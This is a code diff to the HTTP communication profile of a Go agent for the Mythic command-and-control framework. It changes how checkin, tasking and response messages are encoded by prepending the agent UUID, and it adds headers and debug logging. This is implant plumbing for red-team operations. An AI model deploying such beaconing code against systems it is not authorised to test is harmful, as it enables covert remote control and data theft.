@@ -89,8 +89,9 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 		}
 	}
 
-	// Base64 encode the data as Mythic expects
-	encodedData := base64.StdEncoding.EncodeToString(body)
+	// Send using Freyja-style format: UUID + JSON, then base64 encode
+	messageData := append([]byte(agent.PayloadUUID), body...)
+	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	// Send checkin request to configured endpoint
 	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
@@ -131,8 +132,9 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 		}
 	}
 
-	// Base64 encode the data as Mythic expects
-	encodedData := base64.StdEncoding.EncodeToString(body)
+	// Send using Freyja-style format: UUID + JSON, then base64 encode
+	messageData := append([]byte(agent.PayloadUUID), body...)
+	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
@@ -190,7 +192,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 }
 
 // PostResponse sends a response back to Mythic
-func (h *HTTPProfile) PostResponse(response structs.Response) error {
+func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent) error {
 	responseMsg := structs.PostResponseMessage{
 		Action:    "post_response",
 		Responses: []structs.Response{response},
@@ -209,8 +211,9 @@ func (h *HTTPProfile) PostResponse(response structs.Response) error {
 		}
 	}
 
-	// Base64 encode the data as Mythic expects
-	encodedData := base64.StdEncoding.EncodeToString(body)
+	// Send using Freyja-style format: UUID + JSON, then base64 encode
+	messageData := append([]byte(agent.PayloadUUID), body...)
+	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
 	if err != nil {
@@ -244,12 +247,14 @@ func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Respo
 		return nil, fmt.Errorf("failed to create request: %w", err)
 	}
 
-	// Set headers
+	// Set headers for Mythic C2
 	req.Header.Set("User-Agent", h.UserAgent)
 	req.Header.Set("Content-Type", "text/plain")
+	req.Header.Set("Accept", "*/*")
 
 	if h.Debug {
 		log.Printf("[DEBUG] Making %s request to %s", method, url)
+		log.Printf("[DEBUG] Request body: %s", string(body))
 	}
 
 	return h.client.Do(req)
